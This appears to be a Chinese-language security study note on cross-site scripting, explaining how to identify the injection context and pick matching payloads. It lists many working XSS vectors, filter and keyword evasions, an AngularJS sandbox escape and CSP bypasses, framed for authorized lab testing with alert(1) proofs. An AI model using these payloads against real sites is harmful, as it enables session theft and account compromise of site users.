---
title: "XSS：上下文与向量选择"
summary: "先判断输入落在 HTML、属性、URL、JS、JSON 还是 DOM，再选闭合符与向量；含编码绕过、框架入口、CSP 限制与从 XSS 到下一步。"
module: Web
topic: "Web漏洞"
tags: []
status: 已整理
sourceIds: []
challengeIds: []
relatedIds: ["web-csrf", "web-xs-leaks", "web-prototype-pollution", "web-browser-output"]
updated: "2026-10-29"
---

XSS 的成败取决于**注入点落在哪个上下文**，而不是 payload 库有多全。先把回显位置分类，再决定闭合符、编码与标签；上下文判断错，后面全是无效尝试。

> 只对本地靶场或授权站点测试；验证用 `alert(1)`/`console.log`，不要执行破坏性操作。

## 00 30 秒速查

| 我要… | 先试… | 备注 |
|---|---|---|
| 确认是否反射 | 输入唯一串 `xss<canary>`，看源码 | 看原样/编码/被过滤 |
| 判断上下文 | 看回显前后字符 | 文本/属性/URL/JS/JSON/CSS |
| HTML 文本 | `<img src=x onerror=alert(1)>` | `<script>` 被过滤时优先 |
| 引号属性 | `" onmouseover="alert(1)` | 先确认引号类型 |
| 无引号属性 | `x onmouseover=alert(1)` | 空格分隔 |
| URL 属性 | `javascript:alert(1)` | 试实体/Tab/大小写 |
| JS 字符串 | `';alert(1);//` | 先确认引号与转义 |
| 模板字符串 | `${alert(1)}` | 反引号上下文 |
| JSON 内联 | `</script><script>alert(1)</script>` | 仅 HTML 内联时 |
| DOM 型 | `#"><img src=x onerror=alert(1)>` | 看 source→sink |
| 被 CSP 拦 | 找同源 JSONP/上传/`base` | 看 `script-src` |
| 验证 | 弹窗/控制台/网络回连 | 记录最小 payload |

## 01 原理与成立条件

```text
用户输入 → 服务端拼接/前端写入 → 浏览器按上下文解析
                                      ↓
                          数据被当成 HTML/JS/URL 执行
```

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 输入可达输出 | 参数进入页面/属性/脚本/DOM | 找存储型、二次渲染、Header 回显 |
| 未被正确编码 | 没有按上下文转义 | 找编码缺口/双重解码 |
| 浏览器会解释 | 落在可执行上下文 | 换上下文或找 DOM sink |
| 有触发条件 | 事件/加载/点击/自动 | 换自动触发向量 |

XSS 不是“弹窗漏洞”，而是**在受害者浏览器里执行脚本**；弹窗只是证明执行。

## 02 判断与分型

```text
输入回显在页面？
 ├─ 否 → 存储型/盲 XSS/DOM 型
 └─ 是
    看回显位置：
    ├─ HTML 文本 → L1 标签/事件
    ├─ 属性 → L2 闭合引号/无引号
    ├─ URL → L2 javascript:/data:
    ├─ <script> 内 → L3 闭合字符串/模板
    ├─ JSON 内联 → L3 </script> 逃逸
    └─ CSS → L3 expression/url()
    还有过滤/CSP？
    ├─ 有 → L4 绕过/框架入口
    └─ 无 → 直接执行
```

| 信号 | 含义 | 下一步 |
|---|---|---|
| 输入原样出现在源码 | 未编码 | 按上下文选向量 |
| `<` 变成 `&lt;` | HTML 实体编码 | 属性/URL/JS 上下文仍可能 |
| 引号被转义 | 属性/JS 被保护 | 找无引号属性/模板字符串 |
| `alert` 被过滤 | 关键字黑名单 | `confirm`/`prompt`/`top["al"+"ert"]` |
| 弹窗不执行但控制台报错 | 语法/上下文错 | 看 Console 与 DOM |
| CSP 报错 | 脚本源受限 | 找同源/JSONP/`base` |

| 假阳性 | 原因 | 处理 |
|---|---|---|
| 输入出现在源码但被编码 | 服务端转义 | 换上下文 |
| `alert` 被拦但 `console.log` 可 | 关键字过滤 | 用无关键字向量 |
| 弹窗在自身浏览器出现 | 只验证了反射 | 换受害者会话/存储型 |
| `<script>` 不执行 | 插入到 innerHTML | 用事件属性/SVG |

## 03 利用阶梯

### L0 确认上下文

**前提**：有一个会回显的参数或存储点。

**步骤**：
1. 输入唯一串 `xss<canary>123`，提交后看源码。
2. 标记回显位置前后的字符（标签内/属性内/脚本内）。
3. 输入 `"'<>\`` 观察哪些字符被编码/删除。

**成功标志**：能准确说出“回显在哪个上下文、哪些字符可用”。

**失败分支**：完全无回显→存储型/盲 XSS/DOM 型；全编码→找二次解码/其他入口。

### L1 HTML 文本

**前提**：输入落在标签之间，`<` 未被编码。

**步骤**：
1. 试 `<img src=x onerror=alert(1)>`。
2. `<script>` 被过滤时试 `<svg onload=alert(1)>`、`<details open ontoggle=alert(1)>`。
3. 看 Console 是否有语法错误。

**成功标志**：弹窗/控制台执行，且刷新/重新访问仍可复现（存储型）。

**失败分支**：标签被过滤→L4；插入 innerHTML 不执行 script→事件属性；CSP→L4。

### L2 属性与 URL

**前提**：输入落在属性值或 URL 属性中。

**步骤**：
1. 双引号：`" onmouseover="alert(1)`；单引号：`' onmouseover='alert(1)`。
2. 无引号：`x onmouseover=alert(1)`。
3. URL：`javascript:alert(1)`，被过滤试 `java\tscript:`、`&#106;avascript:`、大小写。

**成功标志**：事件触发或 URL 执行。

**失败分支**：引号被转义→找无引号属性；`javascript:` 被拦→`data:`/`srcdoc`；CSP→L4。

### L3 JS / 模板 / DOM

**前提**：输入落在 `<script>`、模板字符串或 DOM sink。

**步骤**：
1. 字符串：`';alert(1);//`、`";alert(1);//`。
2. 模板：`${alert(1)}`；能闭合 `</script>` 时直接换脚本。
3. DOM：在 hash/参数放 payload，Hook `innerHTML`/`eval`/`document.write` 看是否进入 sink。
4. JSON 内联：`{"a":"</script><script>alert(1)</script>"}`。

**成功标志**：脚本执行，或 DOM sink 被可控数据命中。

**失败分支**：转义正确→找 `innerHTML`/`eval` 的其他入口；JSON `application/json` 不执行→找前端插入点。

### L4 框架与 CSP

**前提**：基础向量被过滤，或页面有框架/CSP。

**步骤**：
1. AngularJS：`{{constructor.constructor('alert(1)')()}}`；确认 `ng-app`。
2. Vue：`v-html` 插入 `<img onerror>`；`{{}}` 只在编译时。
3. React：`dangerouslySetInnerHTML`；普通 `{}` 会转义。
4. jQuery：`$(location.hash)`、`.html()`、`.append()`。
5. CSP：找同源 JSONP、上传 JS、`<base>`、nonce 泄露、DOM clobbering。

**成功标志**：在框架/CSP 限制下仍执行，或找到可加载的同源脚本。

**失败分支**：CSP 严格且无同源→转 CSRF/XS-Leaks；框架沙箱→找逃逸/旧版本。

## 04 绕过与边界

| 被拦 | 替代 | 示例 |
|---|---|---|
| `<script>` | 事件属性/SVG | `<img src=x onerror=alert(1)>` |
| `on*` | `<svg><a xlink:href="javascript:...">` | 或 `<math href>` |
| 引号 | 无引号属性/反引号 | `x onmouseover=alert(1)` |
| 空格 | `/`、Tab、换行 | `<svg/onload=alert(1)>` |
| 括号 | `alert\`1\``、`throw` | `onerror=alert;throw 1` |
| `alert` | `confirm`/`prompt`/`console.log` | `top["al"+"ert"](1)` |
| `javascript:` | 实体/Tab/大小写 | `java\tscript:alert(1)` |
| `<`/`>` | 属性内实体 | `&lt;` 在文本节点解码 |
| CSP inline | 同源 JSONP/上传 | `<script src=/api?callback=...>` |

边界：HTML 实体在 `<script>` 内不解码；`innerHTML` 插入的 `<script>` 不执行；CSP 只降低危害，不等于没有 XSS。

## 05 非典型入口

| 位置 | 示例 | 注意 |
|---|---|---|
| DOM source | `location.hash`、`referrer`、`window.name` | 服务端日志看不到 |
| postMessage | `event.data` 直接进 `innerHTML` | 检查 `origin` |
| JSONP | `callback=alert(1)` | 同源脚本加载 |
| 上传 SVG | `<svg onload=...>` | `Content-Type: image/svg+xml` |
| Markdown | 允许原始 HTML | 渲染器配置 |
| 邮件/富文本 | HTML 邮件、签名 | 客户端过滤差异 |
| Header | `User-Agent` 回显到页面 | 存储型 |
| 文件名 | 上传文件名回显 | 需闭合上下文 |

## 06 差异速查

| 项 | 浏览器/框架 | 影响 |
|---|---|---|
| `innerHTML` | 不执行 `<script>` | 用事件属性/SVG |
| `document.write` | 可执行脚本 | 但会覆盖页面 |
| AngularJS | 1.6 后移除沙箱 | `{{}}` 可直接执行 |
| Vue | `v-html` 不编译模板 | 事件属性仍执行 |
| React | 默认转义 | `dangerouslySetInnerHTML` 例外 |
| CSP `script-src` | 限制脚本源 | 看 nonce/hash/同源 |
| `HttpOnly` | 阻止读 Cookie | 仍可发请求/读页面 |

## 07 工具与验证

| 目标 | 工具/操作 |
|---|---|
| 看上下文 | DevTools → Elements → 看回显前后 |
| 看执行 | Console、断点、`debugger` |
| Hook sink | 重写 `innerHTML`/`eval`/`document.write` |
| 生成 payload | PayloadsAllTheThings、XSStrike |
| DOM 型 | DOM Invader、DevTools Sources |
| CSP | CSP Evaluator、Console 报错 |
| 盲 XSS | XSS Hunter/自建回连 |
| 记录 | 保存请求、响应、截图、Console |

验证顺序：源码上下文 → 最小 payload → Console 错误 → 换会话复现 → 记录。

## 08 实战流程

| 阶段 | 动作 | 产出 |
|---|---|---|
| 1 入口 | 参数、表单、Header、文件名、富文本 | 可控点清单 |
| 2 上下文 | 唯一串标记回显 | 上下文分类 |
| 3 基线 | 最小 payload | 是否执行 |
| 4 绕过 | 过滤/CSP/框架 | 可用向量 |
| 5 影响 | Cookie/接口/CSRF/键盘 | 影响证据 |
| 6 复现 | 换会话/存储型 | 稳定 PoC |
| 7 记录 | 请求/响应/截图 | 报告 |

## 09 失败分支

| 现象 | 优先怀疑 | 处理 |
|---|---|---|
| 输入完全消失 | 被过滤/未回显 | 换参数/存储型/Header |
| `<` 被编码 | HTML 实体 | 试属性/URL/JS 上下文 |
| 弹窗不执行 | 上下文错/语法错 | 看 Console 与 DOM |
| `<script>` 不执行 | innerHTML | 换事件属性/SVG |
| `alert` 被拦 | 关键字过滤 | `confirm`/拼接/编码 |
| CSP 拦截 | 脚本源限制 | 同源 JSONP/上传/`base` |
| 仅自己浏览器触发 | 反射型/本地 | 换受害者会话 |
| 存储型不触发 | 输出位置/触发条件 | 找列表页/详情页/事件 |

## 10 记录与复现

- [ ] 入口与上下文
- [ ] 最小 payload 与编码形态
- [ ] 过滤/CSP/框架限制
- [ ] 触发条件与受害者会话
- [ ] 执行证据（截图/Console/回连）
- [ ] 影响（Cookie/接口/CSRF）

| 记录项 | 内容 |
|---|---|
| 入口 | URL/参数/Header/存储点 |
| 上下文 | HTML/属性/URL/JS/JSON/DOM |
| Payload | 最小可复现一条 |
| 绕过 | 编码/标签/框架/CSP |
| 结果 | 弹窗/请求/数据 |
| 限制 | 过滤/CSP/HttpOnly |

相关： [CSRF](/knowledge/web-csrf/)、[XS-Leaks](/knowledge/web-xs-leaks/)、[原型链污染](/knowledge/web-prototype-pollution/)、[浏览器输出](/knowledge/web-browser-output/)。
